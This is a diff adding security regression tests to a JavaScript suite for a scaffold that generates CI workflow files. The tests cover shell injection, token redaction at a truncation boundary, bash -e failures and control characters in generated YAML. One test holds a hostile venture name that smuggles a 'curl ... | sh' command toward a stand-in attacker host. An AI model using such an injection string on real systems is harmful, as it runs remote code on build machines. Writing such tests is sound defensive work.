@@ -68,6 +68,23 @@ describe('venture-scaffold MODULE_REGISTRY', () => {
     expect(deployYml.content).toContain('post-deploy-signed-in-uat'); // UAT probe preserved
   });
 
+  // Adversarial deep-tier review finding (ship-adversarial-review, PR #7482, WARNING):
+  // the writer sanitizes ventureName before calling generate(), but MODULE_REGISTRY is
+  // newly exported by this PR and the CLI (a documented entry point) passes raw argv
+  // straight through with no d1DatabaseName override -- so an unsanitized name reaches
+  // the deploy.yml `run:` line unquoted. Reproduces the reviewer's exact PoC: a name
+  // containing a shell command sequence must not survive into the generated workflow.
+  it('SEC-2 regression: an unsanitized venture name (as a direct caller / the CLI would pass) cannot inject shell commands into deploy.yml', async () => {
+    const { MODULE_REGISTRY } = await import(scaffoldPath);
+    const hostileName = 'evil; curl http://attacker.test/x | sh #';
+    const files = MODULE_REGISTRY.deploy.generate(hostileName, '/tmp/evil', {});
+    const deployYml = files.find(f => f.path.endsWith('deploy.yml'));
+    expect(deployYml.content).not.toContain('curl http://attacker.test');
+    expect(deployYml.content).not.toContain('| sh');
+    // Normalized (kebab, alphanumeric-only) form is used instead of the raw name.
+    expect(deployYml.content).toMatch(/wrangler d1 migrations apply evil-curl-http-attacker-test-x-sh --remote/);
+  });
+
   // SEC-4 residual (SECURITY re-verification, evidence 8eec89e0): an .error field
   // containing the token in prose ("token X is expired") survived the .error/.message
   // allowlist unredacted, since the allowlist only bounds WHICH field is read, not
@@ -95,6 +112,64 @@ describe('venture-scaffold MODULE_REGISTRY', () => {
       });
       expect(out).not.toContain(token);
       expect(out).toContain('[REDACTED]');
+    } finally {
+      rmSync(dir, { recursive: true, force: true });
+    }
+  });
+
+  // Adversarial deep-tier review finding (ship-adversarial-review, PR #7482, WARNING):
+  // the redaction script sliced the message to 300 chars BEFORE redacting the token
+  // (`out=m.slice(0,300)` then `out.split(t).join('[REDACTED]')`), so a token straddling
+  // the 300-char boundary has its prefix land inside `out` while the FULL token string
+  // is no longer present to match against -- the split silently no-ops and the prefix
+  // leaks verbatim. Fixed by redacting the full message first, then slicing. This test
+  // constructs exactly that straddling case (token starts at char 285, well past the
+  // token's own length before the 300-char cut) and proves no fragment of it survives.
+  it('SEC-4 regression: a token straddling the 300-char truncation boundary is still fully redacted', () => {
+    const dir = mkdtempSync(join(tmpdir(), 'sec4-boundary-test-'));
+    try {
+      const src = readFileSync(scaffoldPath, 'utf-8');
+      const nodeECalls = [...src.matchAll(/node -e "([^"]*)"/g)];
+      const script = nodeECalls[0][1];
+
+      const token = 'sess_AAAABBBBCCDDEEFFGGHHIIJJKK';
+      const prefix = 'x'.repeat(285);
+      writeFileSync(join(dir, 'response.json'), JSON.stringify({ error: `${prefix}${token}` }), 'utf-8');
+
+      const out = execFileSync('node', ['-e', script], {
+        cwd: dir,
+        encoding: 'utf-8',
+        env: { ...process.env, CHAIRMAN_UAT_SESSION_TOKEN: token },
+      });
+      expect(out).not.toContain(token);
+      // No fragment of the token (any substring >= 8 chars) should survive either.
+      expect(out).not.toMatch(/sess_AAAABBBB/);
+    } finally {
+      rmSync(dir, { recursive: true, force: true });
+    }
+  });
+
+  // Adversarial deep-tier review finding (ship-adversarial-review, PR #7482, WARNING):
+  // the ALLOWED_ORIGINS check reproduces the already-fixed bash -e defect class in a
+  // step that was never fixed. `PINNED=$(grep ... | grep ...)` fails (exit 1) whenever
+  // wrangler.toml is absent or has no ALLOWED_ORIGINS line -- a legitimate, explicitly
+  // tolerated case per the step's own final echo -- but a failed command-substitution
+  // ASSIGNMENT trips `bash -e` and aborts the script before the tolerance check ever
+  // runs. Extracts the real generated PINNED= line and executes it under `bash -e` in
+  // a directory with no wrangler.toml, proving the script survives instead of aborting.
+  it('ALLOWED_ORIGINS regression: the PINNED= assignment does not trip bash -e when wrangler.toml is absent', () => {
+    const dir = mkdtempSync(join(tmpdir(), 'allowed-origins-bash-e-test-'));
+    try {
+      const src = readFileSync(scaffoldPath, 'utf-8');
+      const pinnedLineMatch = src.match(/^\s*PINNED=\$\([^\n]*\)\s*$/m);
+      expect(pinnedLineMatch, 'expected to find the PINNED= assignment line in scaffold.js').not.toBeNull();
+      const pinnedLine = pinnedLineMatch[0].trim();
+
+      const out = execFileSync('bash', ['-e', '-c', `${pinnedLine}\necho SURVIVED`], {
+        cwd: dir,
+        encoding: 'utf-8',
+      });
+      expect(out).toContain('SURVIVED');
     } finally {
       rmSync(dir, { recursive: true, force: true });
     }
@@ -220,6 +295,36 @@ describe('venture-scaffold MODULE_REGISTRY', () => {
     // A bare `git grep ... \n rc=$?` (no `||`) would abort under `bash -e` on git
     // grep's own exit 1 (no match) before `rc=$?` ever runs -- the exact bug found.
     expect(stackScanYml.content).toMatch(/git grep[^\n]*\|\|\s*rc=\$\?/);
+  });
+
+  // Adversarial deep-tier review finding (ship-adversarial-review, PR #7482, CRITICAL):
+  // `\b` inside the SEC-3 explanatory comment prose is a RECOGNIZED JS escape (backspace,
+  // U+0008), not an unrecognized one -- a different mechanism from the already-fixed
+  // `\.`-collapse bug, but the same class of "JS template literal escape corrupts
+  // generated output". Reproduced: the pre-fix generated stack-scan.yml contained three
+  // literal U+0008 bytes and js-yaml rejected the whole file with a
+  // non-printable-characters error. Every generated file this module produces must be
+  // valid YAML with no control characters -- nothing in this suite checked that before.
+  it('generated stack-scan.yml is valid YAML with no control characters (regression for the \\b escape-collapse bug)', async () => {
+    const yaml = await import('js-yaml');
+    const { MODULE_REGISTRY } = await import(scaffoldPath);
+    const files = MODULE_REGISTRY['stack-scan'].generate('acme-venture', '/tmp/acme-venture', {});
+    const stackScanYml = files.find((f) => f.path.endsWith('stack-scan.yml'));
+
+    // eslint-disable-next-line no-control-regex
+    const controlCharMatch = stackScanYml.content.match(/[\x00-\x08\x0B\x0C\x0E-\x1F]/);
+    expect(controlCharMatch, `found control char ${controlCharMatch ? JSON.stringify(controlCharMatch[0]) : ''} in generated stack-scan.yml`).toBeNull();
+    expect(() => yaml.load(stackScanYml.content)).not.toThrow();
+  });
+
+  it('generated deploy.yml and feedback module files are also valid YAML/free of control characters', async () => {
+    const yaml = await import('js-yaml');
+    const { MODULE_REGISTRY } = await import(scaffoldPath);
+    const deployFiles = MODULE_REGISTRY.deploy.generate('acme-venture', '/tmp/acme-venture', {});
+    const deployYml = deployFiles.find((f) => f.path.endsWith('deploy.yml'));
+    expect(() => yaml.load(deployYml.content)).not.toThrow();
+    // eslint-disable-next-line no-control-regex
+    expect(deployYml.content.match(/[\x00-\x08\x0B\x0C\x0E-\x1F]/)).toBeNull();
   });
 
   it('module-registry.json stays in sync with MODULE_REGISTRY (version + module set) — not orphaned dead data', async () => {
